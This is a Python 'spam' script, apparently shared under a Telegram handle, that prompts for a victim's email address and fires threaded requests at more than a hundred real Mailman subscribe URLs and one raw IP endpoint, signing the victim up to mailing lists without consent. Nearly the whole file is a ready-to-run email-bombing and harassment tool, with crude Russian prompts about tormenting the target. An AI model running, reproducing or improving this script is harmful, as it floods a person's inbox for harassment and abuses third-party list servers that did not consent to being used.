import requests
import colorama
import threading
import os

os.system("clear")


count = 0

def spam():
	global spam_id, count, urls
	for i in urls:
		count += 1
		try:
			requests.get(i, timeout=2); print(colorama.Fore.YELLOW + "Spam email №{} sent to {}".format(count, colorama.Fore.WHITE + spam_id))
		except:
			print(colorama.Fore.RED + "Service ERROR №" + str(count))


print(colorama.Fore.GREEN + """
░└┐░░░░░░░░░░░░░░░░░┌┘░██
██░░└┐░░░░░░░░░░░░░░░┌┘░░██
██░░┌┘▄▄▄▄▄░░░░░▄▄▄▄▄└┐░░██
██▌░│██████▌░░░▐██████│░▐██
███░│▐███▀▀░░▄░░▀▀███▌│░███
██▀─┘░░░░░░░▐█▌░░░░░░░└─▀██
██▄░░░▄▄▄▓░░▀█▀░░▓▄▄▄░░░▄██
████▄─┘██▌░░░░░░░▐██└─▄████
█████░░▐█─┬┬┬┬┬┬┬─█▌░░█████
████▌░░░▀┬┼┼┼┼┼┼┼┬▀░░░▐████
█████▄░░░└┴┴┴┴┴┴┴┘░░░▄█████  """ + colorama.Fore.CYAN + "\n 			 @WORLDHAK_666 (ТЕЛЕГА) \n ----------------------------------\n\n")


spam_id = input(colorama.Fore.MAGENTA + "НАПИШИ КОМУ ЕБАТЬ МОЗГИ: " + colorama.Fore.WHITE)
urls = ["http://ml.ci.uc.pt/mailman/subscribe/archport?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://flybynews.com/mailman/subscribe/flybynews_flybynews.com?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://www.winehq.org/mailman/subscribe/wine-users?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://lists.gnupg.org/mailman/subscribe/gnupg-users?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://mailman.acomp.usf.edu/mailman/subscribe/lacsf?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://lists.drupal.org/mailman/subscribe/development?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://webmail.mnet.state.mn.us/mailman/subscribe/dhs-csed?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://www.ogf.org/mailman/subscribe/occi-wg?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://theory.sinp.msu.ru/mailman/subscribe/ru-ngi?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://lists.cluenet.de/mailman/subscribe/ipv6-ops?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://188.225.74.75:13211/index.php?email="+spam_id
,"http://list.blackcats.org.uk/mailman/subscribe/blackcats?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"https://lists.secondlife.com/cgi-bin/mailman/subscribe/combat-devs?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"https://lists.secondlife.com/cgi-bin/mailman/subscribe/ctproject?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"https://lists.secondlife.com/cgi-bin/mailman/subscribe/educators?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"https://lists.secondlife.com/cgi-bin/mailman/subscribe/exchanges?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"https://lists.secondlife.com/cgi-bin/mailman/subscribe/government?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"https://lists.secondlife.com/cgi-bin/mailman/subscribe/healthcare?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"https://lists.secondlife.com/cgi-bin/mailman/subscribe/international?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"https://lists.secondlife.com/cgi-bin/mailman/subscribe/jira-notify?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"https://lists.secondlife.com/cgi-bin/mailman/subscribe/lea?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"https://lists.secondlife.com/cgi-bin/mailman/subscribe/mailman-test?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"https://lists.secondlife.com/cgi-bin/mailman/subscribe/musicdevelopment?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"https://lists.secondlife.com/cgi-bin/mailman/subscribe/nonprofits?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"https://lists.secondlife.com/cgi-bin/mailman/subscribe/opensource-dev?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"https://lists.secondlife.com/cgi-bin/mailman/subscribe/regapi?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"https://lists.secondlife.com/cgi-bin/mailman/subscribe/secondlifescripters?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"https://lists.secondlife.com/cgi-bin/mailman/subscribe/server-beta?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"https://lists.secondlife.com/cgi-bin/mailman/subscribe/sl-ux?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"https://lists.secondlife.com/cgi-bin/mailman/subscribe/slbusiness?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"https://lists.secondlife.com/cgi-bin/mailman/subscribe/slcorporateuse?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"https://lists.secondlife.com/cgi-bin/mailman/subscribe/tpvdir-announce?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"https://lists.secondlife.com/cgi-bin/mailman/subscribe/viewer-development-builds?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"https://lists.secondlife.com/cgi-bin/mailman/subscribe/viewer-development-commits?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://lists.xen.org/cgi-bin/mailman/subscribe/xen-announce?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://miniaturelists.com/mailman/subscribe/ladyjane_miniaturelists.com?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://lists.fossil-scm.org:8080/cgi-bin/mailman/subscribe/fossil-dev?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://lists.fossil-scm.org:8080/cgi-bin/mailman/subscribe/fossil-users?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://lists.fossil-scm.org:8080/cgi-bin/mailman/subscribe/jim-devel?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://lists.fossil-scm.org:8080/cgi-bin/mailman/subscribe/mailman?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://lists.fossil-scm.org:8080/cgi-bin/mailman/subscribe/sqlite-announce?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://lists.fossil-scm.org:8080/cgi-bin/mailman/subscribe/sqlite-dev?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://lists.fossil-scm.org:8080/cgi-bin/mailman/subscribe/sqlite-users?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://sqlite.org:8080/cgi-bin/mailman/subscribe/fossil-dev?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://sqlite.org:8080/cgi-bin/mailman/subscribe/fossil-users?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://sqlite.org:8080/cgi-bin/mailman/subscribe/jim-devel?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://sqlite.org:8080/cgi-bin/mailman/subscribe/mailman?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://sqlite.org:8080/cgi-bin/mailman/subscribe/sqlite-announce?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://sqlite.org:8080/cgi-bin/mailman/subscribe/sqlite-dev?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://sqlite.org:8080/cgi-bin/mailman/subscribe/sqlite-users?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://starj.com/mailman/subscribe/headlines_starj.com?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://lists.arin.net/mailman/subscribe/2050-wg?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://lists.arin.net/mailman/subscribe/ac.help?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://lists.arin.net/mailman/subscribe/aflow?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://lists.arin.net/mailman/subscribe/arin-announce?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://lists.arin.net/mailman/subscribe/arin-discuss?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://lists.arin.net/mailman/subscribe/arin-issued?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://lists.arin.net/mailman/subscribe/arin-ppml?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://lists.arin.net/mailman/subscribe/arin-suggestions?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://lists.arin.net/mailman/subscribe/arin-tech-discuss?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://lists.arin.net/mailman/subscribe/arin-whoisrws?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://lists.arin.net/mailman/subscribe/audcom?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://lists.arin.net/mailman/subscribe/clew?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://lists.arin.net/mailman/subscribe/dbwg?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://lists.arin.net/mailman/subscribe/info?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://lists.arin.net/mailman/subscribe/meetingguests?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://lists.arin.net/mailman/subscribe/naipr?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://lists.arin.net/mailman/subscribe/nrpm-edit?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://lists.arin.net/mailman/subscribe/nrr-blueprint?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://lists.arin.net/mailman/subscribe/policy?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://lists.arin.net/mailman/subscribe/rtma?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://lists.arin.net/mailman/subscribe/v6wg?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://lists.arin.net/mailman/subscribe/vwp?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://www.wplug.org/mailman/subscribe/wplug-jobs?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://www.open-std.org/mailman/subscribe/ub?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://mail.etree.org/mailman/subscribe/etrade?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"https://listen.jpberlin.de/mailman/subscribe/dhv-info?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://gator2004.hostgator.com/mailman/subscribe/gossip_queensoflasvegas.com?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://noticias.livio.com/mailman/subscribe/notird_noticias.livio.com?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://developer.marklogic.com/mailman/subscribe/commits?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://developer.marklogic.com/mailman/subscribe/corona?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://developer.marklogic.com/mailman/subscribe/general?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://developer.marklogic.com/mailman/subscribe/roxy?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://list.webaim.org/mailman/subscribe/webaim-forum?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://lists.copyleft.no/mailman/subscribe/gatasp-nyhetsbrev?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://www.orcas.net/mailman/subscribe/krahnos?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://www.orcas.net/mailman/subscribe/lasvegasfur?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://www.orcas.net/mailman/subscribe/networkoperations?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://lists.randombit.net/mailman/subscribe/botan-announce?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://lists.randombit.net/mailman/subscribe/botan-devel?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://lists.randombit.net/mailman/subscribe/cryptography?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://lists.randombit.net/mailman/subscribe/cryptopolitics?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://mail.scipy.org/mailman/subscribe/announce?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://mail.scipy.org/mailman/subscribe/apug?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://mail.scipy.org/mailman/subscribe/astropy?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://mail.scipy.org/mailman/subscribe/ipython-dev?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://mail.scipy.org/mailman/subscribe/ipython-user?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://mail.scipy.org/mailman/subscribe/mailman?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://mail.scipy.org/mailman/subscribe/nipy-devel?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://mail.scipy.org/mailman/subscribe/numpy-discussion?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://mail.scipy.org/mailman/subscribe/numpy-refactor?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://mail.scipy.org/mailman/subscribe/numpy-refactor-git?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://mail.scipy.org/mailman/subscribe/numpy-svn?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://mail.scipy.org/mailman/subscribe/numpy-tickets?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://mail.scipy.org/mailman/subscribe/pyxg?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://mail.scipy.org/mailman/subscribe/scipy-dev?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://mail.scipy.org/mailman/subscribe/scipy-svn?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://mail.scipy.org/mailman/subscribe/scipy-tickets?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://mail.scipy.org/mailman/subscribe/scipy-user?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://mail.kein.org/mailman/subscribe/maad-l?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://mail.kein.org/mailman/subscribe/migrar-ffm?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://mail.kein.org/mailman/subscribe/mir-l?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://mail.kein.org/mailman/subscribe/missinginfo?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://mail.kein.org/mailman/subscribe/mode05-info?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://mail.kein.org/mailman/subscribe/movisat?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://mail.kein.org/mailman/subscribe/neuro-l?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://mail.kein.org/mailman/subscribe/organizing-l?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://mail.kein.org/mailman/subscribe/pgainfo-l?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://mail.kein.org/mailman/subscribe/straub-huillet?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://mail.kein.org/mailman/subscribe/subtext-l?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://mail.kein.org/mailman/subscribe/syndikat-ost?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://mail.kein.org/mailman/subscribe/tarifa-l?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://mail.kein.org/mailman/subscribe/transfiction?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://mail.kein.org/mailman/subscribe/tuesday-l?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://mail.kein.org/mailman/subscribe/update?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://mail.kein.org/mailman/subscribe/v2v-server?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://mail.kein.org/mailman/subscribe/vim-colloquium?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://mail.kein.org/mailman/subscribe/vim-preview?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://mail.kein.org/mailman/subscribe/wmg-info?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://mail.kein.org/mailman/subscribe/yoi-l?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://mailman.nginx.org/mailman/subscribe/nginx?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://mailman.nginx.org/mailman/subscribe/nginx-announce?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://mailman.nginx.org/mailman/subscribe/nginx-devel?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://mailman.nginx.org/mailman/subscribe/nginx-ru?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://mailman.nginx.org/mailman/subscribe/nginx-ru-announce?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://www.audifans.com/mailman/subscribe/200q20v?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://www.audifans.com/mailman/subscribe/20v?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://www.audifans.com/mailman/subscribe/a4?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://www.audifans.com/mailman/subscribe/a8?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://www.audifans.com/mailman/subscribe/ba-group?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://www.audifans.com/mailman/subscribe/biturbos4?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://www.audifans.com/mailman/subscribe/es2?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://www.audifans.com/mailman/subscribe/events?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://www.audifans.com/mailman/subscribe/marketplace?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://www.audifans.com/mailman/subscribe/offtopic?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://www.audifans.com/mailman/subscribe/quattro?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://www.audifans.com/mailman/subscribe/staff?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://www.audifans.com/mailman/subscribe/torsen?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://www.audifans.com/mailman/subscribe/tt?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://www.audifans.com/mailman/subscribe/urq?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://www.audifans.com/mailman/subscribe/v6-12v?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://www.audifans.com/mailman/subscribe/v8?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://www.audifans.com/mailman/subscribe/vwdiesel?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://list.healthnet.org/mailman/subscribe/india-drug?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://list.healthnet.org/mailman/subscribe/pronut-hiv?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://peter.petra.ac.id/cgi-bin/mailman/subscribe/dosen-ti-aktif?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://optimizationweek.com/mailman/subscribe/news_optimizationweek.com?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://lists.icpsr.umich.edu/mailman/subscribe/NCAA_student-athlete_archive?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://roadtonet.com/mailman/subscribe/westbridge-artreport_roadtonet.com?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://list.xvid.org/mailman/subscribe/xvid-announce?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://lists.lugod.org/mailman/subscribe/vox-announce?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://www.skiifwrald.com/mailman/subscribe/alertmailinglist_skiifwrald.com?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://lists.umanitoba.ca/mailman/subscribe/student-weekly-bannatyne?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
,"http://lists.umanitoba.ca/mailman/subscribe/student-weekly-fort-garry?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"]

for i in range(int(input(colorama.Fore.MAGENTA + "МОЩНОСТЬ (ТУРБО ЕБАЛКА: 10): " + colorama.Fore.WHITE))):
	threading.Thread(target=spam).start()
